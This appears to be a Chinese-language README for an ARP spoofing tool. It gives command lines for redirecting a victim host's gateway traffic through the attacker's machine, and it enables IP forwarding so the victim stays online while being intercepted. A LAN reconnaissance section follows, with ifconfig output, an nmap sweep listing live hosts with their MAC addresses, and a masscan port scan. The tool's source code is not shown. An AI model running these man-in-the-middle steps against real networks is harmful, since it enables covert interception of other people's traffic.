#ARP欺骗代码

本项目可实现局域网的arp欺骗。
#使用方法

可以将目标主机发往网关的流量定向骗至本主机 安装 scapy 模块

    sudo apt install python-scapy
    sudo ./venv/bin/python main.py -i eth0 -t 受害人ip -m rep -s 网关ip
    sudo ./venv/bin/python main.py -i eth0 -t 受害人ip -m req -s 网关ip

开启流量转发
不开启的话，被欺骗对象无法上网

    echo 1 > /proc/sys/net/ipv4/ip_forward
---
#内网扫描
##nmap扫描
kali扫描内网在线主机和网关
https://blog.csdn.net/weixin_39793813/article/details/111282240?utm_term=kali%20linux%E6%89%AB%E6%8F%8F%E5%B1%80%E5%9F%9F%E7%BD%91&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2

`ifconfig`

        docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500 #应用虚拟网卡
            inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
            ether 02:42:b5:ad:0d:a5  txqueuelen 0  (Ethernet)
            RX packets 0  bytes 0 (0.0 B)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 0  bytes 0 (0.0 B)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500 #以太网
            ether 18:c0:4d:47:c1:5b  txqueuelen 1000  (Ethernet)
            RX packets 0  bytes 0 (0.0 B)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 0  bytes 0 (0.0 B)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536   #回环接口
            inet 127.0.0.1  netmask 255.0.0.0
            inet6 ::1  prefixlen 128  scopeid 0x10<host>
            loop  txqueuelen 1000  (Local Loopback)
            RX packets 258  bytes 20460 (19.9 KiB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 258  bytes 20460 (19.9 KiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500  #无线网卡
            inet 192.168.124.14  netmask 255.255.255.0  broadcast 192.168.124.255 #网卡信息
            inet6 fe80::8b0e:11c1:df70:9051  prefixlen 64  scopeid 0x20<link>
            ether 60:ee:5c:6f:a1:d5  txqueuelen 1000  (Ethernet)
            RX packets 92829  bytes 91329703 (87.0 MiB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 79605  bytes 11458130 (10.9 MiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
---
`sudo nmap -sP 192.168.124.0/24` #nmap完整扫描局域网内存活主机
                Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-19 18:11 UTC
                Nmap scan report for moshujia.cn (192.168.124.1)
                Host is up (0.0012s latency).
                MAC Address: DC:DA:80:CB:1C:1E (New H3C Technologies)#路由器设备
                Nmap scan report for 192.168.124.6 (192.168.124.6)
                Host is up.
                MAC Address: E6:C0:98:4A:57:7B (Unknown)
                Nmap scan report for 192.168.124.15 (192.168.124.15)
                Host is up.
                MAC Address: 84:6F:CE:C5:2B:07 (Guangdong Oppo Mobile Telecommunications)
                Nmap scan report for 192.168.124.23 (192.168.124.23)
                Host is up.
                MAC Address: 14:5E:69:35:35:01 (Guangdong Oppo Mobile Telecommunications)
                Nmap scan report for 192.168.124.14 (192.168.124.14)
                Host is up.
                Nmap done: 256 IP addresses (5 hosts up) scanned in 3.62 seconds

---
`masscan -p80,8000-8100 192.168.124.1-192.168.124.254 ` #对我们这个局域网主机端口80、8000至8100进行检测
